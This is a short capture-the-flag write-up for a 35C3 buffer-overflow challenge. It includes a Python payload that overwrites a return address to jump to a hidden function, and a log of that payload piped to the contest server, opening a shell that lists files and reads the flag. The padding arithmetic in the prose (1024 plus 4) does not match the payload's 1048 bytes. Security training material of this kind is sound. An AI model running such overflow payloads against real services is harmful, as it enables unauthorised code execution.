# Challenge 1996

42 Points

## Challenge

It's 1996 all over again!
nc 35.207.132.47 22227

The challenge also contains a zip file with the source and the binary of the application behind the given network address.

Difficulty estimate: very easy

## Solution

The C++ code shows an obvious buffer overflow. With the input that can be given to the program, the buffer overflow can be exploited and the pointer to the "hidden" function can be put into the memory to execute and unintended jump.

First we had to find the size of the buffer. From the 1996.cpp file we found that the size is 1024 chars. To exploit program, we need to send at least 1024 characters. After the 1024 we also need 4 chars extra. After that, we can put the address to our function we want to execute (found with objdump -d 1996).

All it takes is a little bit of python:

```
(python -c "print '\x00'*1048+ '\x97\x08\x40\x00\x00\x00\x00\x00'"; cat -) | ./1996

```

This results in a buffer overflow. On normal systems this just results in a segmentation fault (due to security features like address space randomization).

```
root@blackbox:# (python -c "print '\x00'*1048+ '\x97\x08\x40\x00\x00\x00\x00\x00'"; cat -) | nc 35.207.132.47 22227
Which environment variable do you want to read? =ls
1996
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
35C3_b29a2800780d85cfc346ce5d64f52e59c8d12c14

```
There is the flag! :)
